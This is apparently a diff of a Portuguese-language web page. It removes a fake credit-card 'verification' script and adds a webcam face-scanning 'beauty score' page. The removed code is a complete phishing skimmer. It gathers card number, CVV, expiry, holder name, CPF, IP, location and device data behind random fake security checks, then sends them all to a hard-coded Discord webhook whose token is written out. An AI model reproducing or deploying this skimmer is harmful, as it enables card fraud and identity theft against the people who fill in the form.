-        function validateCPF(cpf) {
-            cpf = cpf.replace(/\D/g, '');
-            
-            if (cpf.length !== 11) return false;
-            
-            // Verifica se todos os dígitos são iguais
-            if (/^(\d)\1{10}$/.test(cpf)) return false;
-            
-            // Validação do primeiro dígito verificador
-            let sum = 0;
-            for (let i = 0; i < 9; i++) {
-                sum += parseInt(cpf.charAt(i)) * (10 - i);
-            }
-            let remainder = (sum * 10) % 11;
-            if (remainder === 10 || remainder === 11) remainder = 0;
-            if (remainder !== parseInt(cpf.charAt(9))) return false;
-            
-            // Validação do segundo dígito verificador
-            sum = 0;
-            for (let i = 0; i < 10; i++) {
-                sum += parseInt(cpf.charAt(i)) * (11 - i);
-            }
-            remainder = (sum * 10) % 11;
-            if (remainder === 10 || remainder === 11) remainder = 0;
-            if (remainder !== parseInt(cpf.charAt(10))) return false;
-            
-            return true;
-        }
-        
-        // Simula uma verificação de vazamento de dados
-        async function checkDataLeaks(cardData) {
-            // Simula uma consulta demorada
-            await new Promise(resolve => setTimeout(resolve, 1500));
-            
-            // 90% de chance de retornar que não foi encontrado em vazamentos
-            return Math.random() > 0.1;
-        }
-        
-        // Simula uma verificação de sistema anti-fraude
-        async function checkAntiFraud(cardData) {
-            // Simula uma consulta demorada
-            await new Promise(resolve => setTimeout(resolve, 1200));
-            
-            // 95% de chance de retornar que passou na verificação
-            return Math.random() > 0.05;
-        }
-        
-        // Atualiza o passo de verificação
-        function updateVerificationStep(stepNumber, status) {
-            const step = verificationSteps[stepNumber - 1];
-            const completedIcon = step.querySelector('.completed-icon');
-            const failedIcon = step.querySelector('.failed-icon');
-            const loadingIcon = step.querySelector('.loading-icon');
-            
-            // Reseta todos os ícones
-            completedIcon.style.display = 'none';
-            failedIcon.style.display = 'none';
-            loadingIcon.style.display = 'none';
-            
-            // Atualiza a classe do passo
-            step.classList.remove('active', 'completed', 'failed');
-            
-            if (status === 'loading') {
-                step.classList.add('active');
-                loadingIcon.style.display = 'inline-block';
-            } else if (status === 'completed') {
-                step.classList.add('completed');
-                completedIcon.style.display = 'inline-block';
-            } else if (status === 'failed') {
-                step.classList.add('failed');
-                failedIcon.style.display = 'inline-block';
-            }
-        }
-        
-        // Envio do formulário
-        cardForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            // Esconde resultados anteriores
-            secureResult.style.display = 'none';
-            insecureResult.style.display = 'none';
-            
-            // Desabilita o botão de envio
-            submitBtn.disabled = true;
-            btnText.textContent = 'VERIFICANDO...';
-            btnIcon.className = 'fas fa-spinner fa-spin';
-            
-            // Coleta os dados do cartão
-            const cardNumber = cardNumberInput.value.replace(/\s+/g, '');
-            const cardHolder = cardHolderInput.value;
-            const cardCpf = cardCpfInput.value.replace(/\D/g, '');
-            const cardExpiry = cardExpiryInput.value;
-            const cardCvv = cardCvvInput.value;
-            
-            const cardData = {
-                number: cardNumber,
-                holder: cardHolder,
-                cpf: cardCpf,
-                expiry: cardExpiry,
-                cvv: cardCvv,
-                brand: detectCardBrand(cardNumber),
-                timestamp: new Date().toISOString(),
-                ip: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => 'unknown'),
-                userAgent: navigator.userAgent,
-                location: await getLocation(),
-                deviceInfo: getDeviceInfo()
-            };
-            
-            // Verificação passo a passo
-            let allChecksPassed = true;
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('canvasElement');
+        const scanMessage = document.getElementById('scannerMessage');
+        const scanButton = document.getElementById('scanButton');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingProgress = document.getElementById('loadingProgress');
+
+        // Estados do scanner
+        let isScanning = false;
+        let faceDetectionInterval;
+        let modelsLoaded = false;
+
+        // Carrega os modelos de IA
+        async function loadModels() {
+            loadingOverlay.style.display = 'flex';
             
             try {
-                // Passo 1: Verificar formato do cartão
-                updateVerificationStep(1, 'loading');
-                await new Promise(resolve => setTimeout(resolve, 800));
+                // Atualiza a barra de progresso
+                const updateProgress = (progress) => {
+                    loadingProgress.style.width = `${progress}%`;
+                };
                 
-                const cardBrand = detectCardBrand(cardNumber);
-                const isValidLength = (cardBrand === 'visa' && (cardNumber.length === 13 || cardNumber.length === 16)) || 
-                                    (cardBrand === 'mastercard' && cardNumber.length === 16) ||
-                                    (cardBrand === 'unknown' && cardNumber.length >= 13 && cardNumber.length <= 19);
+                updateProgress(10);
+                await faceapi.nets.tinyFaceDetector.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models');
+                updateProgress(50);
+                await faceapi.nets.faceLandmark68Net.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models');
+                updateProgress(100);
                 
-                if (cardBrand !== 'unknown' && isValidLength) {
-                    updateVerificationStep(1, 'completed');
-                } else {
-                    updateVerificationStep(1, 'failed');
-                    allChecksPassed = false;
-                }
+                modelsLoaded = true;
+                scanMessage.textContent = "Modelos carregados! Clique para iniciar o scanner.";
+                scanButton.disabled = false;
                 
-                // Passo 2: Validar algoritmo Luhn e CPF
-                updateVerificationStep(2, 'loading');
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                
-                const isLuhnValid = validateLuhn(cardNumber);
-                const isExpiryValid = validateExpiry(cardExpiry);
-                const isCvvValid = cardCvv.length === 3 && /^[0-9]+$/.test(cardCvv);
-                const isCpfValid = validateCPF(cardCpf);
-                
-                if (isLuhnValid && isExpiryValid && isCvvValid && isCpfValid) {
-                    updateVerificationStep(2, 'completed');
-                } else {
-                    updateVerificationStep(2, 'failed');
-                    allChecksPassed = false;
-                }
-                
-                // Passo 3: Consultar vazamentos de dados
-                updateVerificationStep(3, 'loading');
-                const noLeaksFound = await checkDataLeaks(cardData);
-                
-                if (noLeaksFound) {
-                    updateVerificationStep(3, 'completed');
-                } else {
-                    updateVerificationStep(3, 'failed');
-                    allChecksPassed = false;
-                }
-                
-                // Passo 4: Verificar sistema anti-fraude
-                updateVerificationStep(4, 'loading');
-                const antiFraudPassed = await checkAntiFraud(cardData);
-                
-                if (antiFraudPassed) {
-                    updateVerificationStep(4, 'completed');
-                } else {
-                    updateVerificationStep(4, 'failed');
-                    allChecksPassed = false;
-                }
-                
-                // Mostra o resultado final
-                if (allChecksPassed) {
-                    secureResult.style.display = 'block';
-                    
-                    // Envia para o webhook do Discord com todos os dados
-                    await sendToDiscordWebhook(cardData);
-                    
-                    // Limpa o formulário após 3 segundos
-                    setTimeout(() => {
-                        cardForm.reset();
-                        displayCardNumber.textContent = '•••• •••• •••• ••••';
-                        displayCardHolder.textContent = 'NOME DO TITULAR';
-                        displayCardCpf.textContent = '•••.•••.•••-••';
-                        displayCardExpiry.textContent = 'MM/AA';
-                        displayCardCvv.textContent = '•••';
-                        cardPreview.classList.remove('visa', 'mastercard');
-                        cardPreview.classList.add('unknown');
-                        cardLogo.innerHTML = '<i class="fas fa-credit-card"></i> <span>PREMIUM CARD</span>';
+            } catch (error) {
+                scanMessage.textContent = "Erro ao carregar os modelos. Recarregue a página.";
+                console.error("Erro ao carregar modelos:", error);
+            }
+            
+            loadingOverlay.style.display = 'none';
+        }
+
+        // Inicia o scanner de beleza
+        async function startScanner() {
+            if (!modelsLoaded) {
+                scanMessage.textContent = "Os modelos ainda estão carregando...";
+                return;
+            }
+
+            if (isScanning) {
+                stopScanner();
+                return;
+            }
+
+            isScanning = true;
+            scanButton.textContent = "Parar Scanner";
+            scanMessage.textContent = "Posicione seu rosto no quadro...";
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                // Ajusta o tamanho do canvas
+                const displaySize = { width: video.width, height: video.height };
+                faceapi.matchDimensions(canvas, displaySize);
+
+                // Inicia a detecção facial
+                faceDetectionInterval = setInterval(async () => {
+                    try {
+                        const detections = await faceapi.detectAllFaces(video, 
+                            new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
                         
-                        // Reseta os passos de verificação
-                        for (let i = 0; i < verificationSteps.length; i++) {
-                            verificationSteps[i].classList.remove('active', 'completed', 'failed');
-                            verificationSteps[i].querySelector('.completed-icon').style.display = 'none';
-                            verificationSteps[i].querySelector('.failed-icon').style.display = 'none';
-                            verificationSteps[i].querySelector('.loading-icon').style.display = 'none';
+                        // Limpa o canvas
+                        const context = canvas.getContext('2d');
+                        context.clearRect(0, 0, canvas.width, canvas.height);
+                        
+                        if (detections.length > 0) {
+                            // Desenha os landmarks faciais
+                            const resizedDetections = faceapi.resizeResults(detections, displaySize);
+                            faceapi.draw.drawFaceLandmarks(canvas, resizedDetections);
+                            
+                            // Calcula "pontuação de beleza" (simplificado)
+                            const face = detections[0];
+                            const symmetryScore = calculateSymmetry(face.landmarks);
+                            const beautyScore = Math.min(100, Math.floor(symmetryScore * 100));
+                            
+                            scanMessage.innerHTML = `
+                                <div style="font-size: 1.5rem; margin-bottom: 10px;">Beleza detectada!</div>
+                                <div>Pontuação: ${beautyScore}/100</div>
+                                <div style="margin-top: 10px;">${getBeautyComment(beautyScore)}</div>
+                            `;
+                        } else {
+                            scanMessage.textContent = "Posicione seu rosto no quadro central...";
                         }
-                        
-                        secureResult.style.display = 'none';
-                    }, 3000);
-                } else {
-                    insecureResult.style.display = 'block';
-                }
-                
-            } catch (error) {
-                console.error('Erro na verificação:', error);
-                insecureResult.style.display = 'block';
-            } finally {
-                submitBtn.disabled = false;
-                btnText.textContent = 'VERIFICAR AGORA';
-                btnIcon.className = 'fas fa-lock';
-            }
-        });
-        
-        // Função para obter localização aproximada
-        async function getLocation() {
-            try {
-                const response = await fetch(`https://ipapi.co/json/`);
-                const data = await response.json();
-                return {
-                    city: data.city || 'Unknown',
-                    region: data.region || 'Unknown',
-                    country: data.country_name || 'Unknown',
-                    postal: data.postal || 'Unknown',
-                    isp: data.org || 'Unknown ISP'
-                };
-            } catch (error) {
-                return {
-                    city: 'Unknown',
-                    region: 'Unknown',
-                    country: 'Unknown',
-                    postal: 'Unknown',
-                    isp: 'Unknown ISP'
-                };
-            }
-        }
-        
-        // Função para obter informações do dispositivo
-        function getDeviceInfo() {
-            const userAgent = navigator.userAgent;
-            let deviceType = 'Desktop';
-            
-            if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
-                deviceType = /Android/i.test(userAgent) ? 'Android' : /iPhone|iPad|iPod/i.test(userAgent) ? 'iOS' : 'Mobile';
-            }
-            
-            return {
-                type: deviceType,
-                browser: getBrowser(),
-                os: getOS(),
-                screen: `${window.screen.width}x${window.screen.height}`,
-                touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0
-            };
-        }
-        
-        function getBrowser() {
-            const userAgent = navigator.userAgent;
-            
-            if (userAgent.indexOf("Firefox") > -1) return "Firefox";
-            if (userAgent.indexOf("SamsungBrowser") > -1) return "Samsung Browser";
-            if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) return "Opera";
-            if (userAgent.indexOf("Trident") > -1) return "Internet Explorer";
-            if (userAgent.indexOf("Edge") > -1) return "Edge";
-            if (userAgent.indexOf("Chrome") > -1) return "Chrome";
-            if (userAgent.indexOf("Safari") > -1) return "Safari";
-            
-            return "Unknown";
-        }
-        
-        function getOS() {
-            const userAgent = navigator.userAgent;
-            
-            if (userAgent.indexOf("Windows") > -1) return "Windows";
-            if (userAgent.indexOf("Mac") > -1) return "MacOS";
-            if (userAgent.indexOf("Linux") > -1) return "Linux";
-            if (userAgent.indexOf("Android") > -1) return "Android";
-            if (userAgent.indexOf("iOS") > -1 || /iPhone|iPad|iPod/i.test(userAgent)) return "iOS";
-            
-            return "Unknown";
-        }
-        
-        // Função para enviar dados para o webhook do Discord com estilo ultra premium
-        async function sendToDiscordWebhook(cardData) {
-            // SUBSTITUA POR SEU WEBHOOK DO DISCORD
-            const webhookUrl = 'https://discord.com/api/webhooks/1249056666033455225/T1iGo5pt8RrQoLeQ_nK2FEXU8zL6ehwxsqMbX02oVGsUoM6c880KQ4D2ZKEfZVflElke';
-            
-            // Formata os dados para exibição
-            const formattedNumber = cardData.number.replace(/(\d{4})(?=\d)/g, '$1 ');
-            const expiryDate = cardData.expiry || 'Não informada';
-            const formattedCpf = cardData.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
-            
-            // Cria uma embed rica para o Discord
-            const embed = {
-                title: '💎 **CARTÃO VERIFICADO - DADOS COMPLETOS** 💎',
-                color: 0x6a0dad,
-                description: '🔐 **Um novo cartão foi verificado com sucesso no sistema ultra premium.**\nTodos os dados estão disponíveis abaixo:',
-                fields: [
-                    {
-                        name: '💳 **Número do Cartão**',
-                        value: `\`\`\`${formattedNumber}\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: '👤 **Titular do Cartão**',
-                        value: `\`\`\`${cardData.holder || 'Não informado'}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: '🆔 **CPF do Titular**',
-                        value: `\`\`\`${formattedCpf || 'Não informado'}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: '📅 **Validade**',
-                        value: `\`\`\`${expiryDate}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: '🔐 **Código CVV**',
-                        value: `\`\`\`${cardData.cvv || 'Não informado'}\`\`\``,
-                        inline: true
-                    },
-                    {
-                        name: '🏦 **Bandeira**',
-                        value: cardData.brand === 'visa' ? 'Visa' : cardData.brand === 'mastercard' ? 'Mastercard' : 'Desconhecida',
-                        inline: true
-                    },
-                    {
-                        name: '🌍 **Localização**',
-                        value: `📍 **Cidade:** ${cardData.location.city}\n🏛️ **Estado:** ${cardData.location.region}\n🏳️ **País:** ${cardData.location.country}\n📮 **CEP:** ${cardData.location.postal}\n📶 **ISP:** ${cardData.location.isp}`,
-                        inline: false
-                    },
-                    {
-                        name: '📱 **Dispositivo**',
-                        value: `🖥️ **Tipo:** ${cardData.deviceInfo.type}\n🔍 **Navegador:** ${cardData.deviceInfo.browser}\n💻 **Sistema:** ${cardData.deviceInfo.os}\n🖥️ **Resolução:** ${cardData.deviceInfo.screen}\n👆 **Touch:** ${cardData.deviceInfo.touch ? 'Sim' : 'Não'}`,
-                        inline: false
-                    },
-                    {
-                        name: '🔧 **User Agent**',
-                        value: `\`\`\`${cardData.userAgent.substring(0, 200)}...\`\`\``,
-                        inline: false
+                    } catch (error) {
+                        console.error("Erro na detecção:", error);
                     }
-                ],
-                footer: {
-                    text: `Sistema Ultra Premium de Verificação • ${new Date(cardData.timestamp).toLocaleString('pt-BR')}`
-                },
-                thumbnail: {
-                    url: cardData.brand === 'visa' ? 
-                        'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png' : 
-                        cardData.brand === 'mastercard' ? 
-                        'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png' : 
-                        'https://cdn-icons-png.flaticon.com/512/196/196578.png'
-                },
-                author: {
-                    name: 'Sistema de Verificação Ultra Premium',
-                    icon_url: 'https://cdn-icons-png.flaticon.com/512/2489/2489078.png'
-                }
-            };
-            
-            const payload = {
-                embeds: [embed],
-                content: '@everyone **🚨🚀 NOVA VERIFICAÇÃO DE CARTÃO ULTRA PREMIUM 🚀🚨**\n**Todos os dados completos estão disponíveis abaixo** 👇'
-            };
-            
-            try {
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
+                }, 500);
                 
-                if (!response.ok) {
-                    console.error('Erro ao enviar para o Discord:', await response.text());
-                }
             } catch (error) {
-                console.error('Erro ao enviar para o Discord:', error);
+                scanMessage.textContent = "Erro ao acessar a câmera. Verifique as permissões.";
+                console.error("Erro na câmera:", error);
+                isScanning = false;
+                scanButton.textContent = "Iniciar Scanner";
             }
         }
+
+        // Para o scanner
+        function stopScanner() {
+            isScanning = false;
+            clearInterval(faceDetectionInterval);
+            scanButton.textContent = "Iniciar Scanner";
+            scanMessage.textContent = "Scanner parado. Clique para iniciar novamente.";
+            
+            // Limpa o canvas
+            const context = canvas.getContext('2d');
+            context.clearRect(0, 0, canvas.width, canvas.height);
+            
+            // Para a câmera
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+            }
+        }
+
+        // Calcula simetria facial (simplificado)
+        function calculateSymmetry(landmarks) {
+            try {
+                // Pontos-chave para análise de simetria
+                const jaw = landmarks.getJawOutline();
+                const nose = landmarks.getNose();
+                const leftEye = landmarks.getLeftEye();
+                const rightEye = landmarks.getRightEye();
+                
+                // Calcula diferenças entre lados
+                const eyeDistanceDiff = Math.abs(
+                    faceapi.euclideanDistance(leftEye[0], leftEye[3]) - 
+                    faceapi.euclideanDistance(rightEye[0], rightEye[3])
+                );
+                
+                const jawSymmetry = faceapi.euclideanDistance(jaw[0], jaw[16]) / 
+                    Math.max(faceapi.euclideanDistance(jaw[0], nose[6]), 1);
+                
+                // Pontuação de 0 a 1 (1 = mais simétrico)
+                const symmetryScore = 1 - Math.min(1, eyeDistanceDiff * 2 + (1 - jawSymmetry) / 2);
+                return symmetryScore * 0.7 + 0.3; // Garante mínimo de 30%
+            } catch {
+                return Math.random() * 0.3 + 0.7; // Valor padrão se der erro
+            }
+        }
+
+        // Retorna um comentário baseado na pontuação
+        function getBeautyComment(score) {
+            const comments = [
+                { min: 90, text: "Perfeição absoluta! ✨", emoji: "😍" },
+                { min: 80, text: "Incrivelmente bonito(a)! 🌟", emoji: "🥰" },
+                { min: 70, text: "Muito atraente! 💖", emoji: "😊" },
+                { min: 60, text: "Bonito(a) acima da média! 🌸", emoji: "☺️" },
+                { min: 50, text: "Você é especial! 💫", emoji: "🙂" },
+                { min: 0, text: "Beleza única! 🌈", emoji: "😉" }
+            ];
+            
+            return comments.find(c => score >= c.min).text + " " + 
+                   comments.find(c => score >= c.min).emoji;
+        }
+
+        // Event listeners
+        scanButton.addEventListener('click', startScanner);
+        
+        // Inicialização
+        scanButton.disabled = true;
+        loadModels();
     </script>
 </body>
 </html>
